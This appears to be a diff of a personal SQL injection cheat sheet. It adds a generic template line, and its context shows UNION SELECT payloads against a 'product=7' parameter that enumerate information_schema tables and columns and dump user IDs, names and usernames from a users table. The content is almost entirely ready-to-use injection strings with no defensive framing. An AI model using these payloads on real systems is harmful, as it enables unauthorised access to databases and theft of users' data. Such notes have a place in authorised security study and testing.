@@ -12,6 +12,7 @@ product=7 UNION SELECT table_schema,column_name,table_name from information_sche
 product=7 UNION SELECT user_id,name,username from siteusers.users;
             Column Names_______|          DataBase____|       |______ Tablename 
 
+UNION SELECT <Column>,<Column>,<Column>,<Column> from <database>.<table>
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 product=7 UNION SELECT table_name,1,column_name FROM information_schema.columns
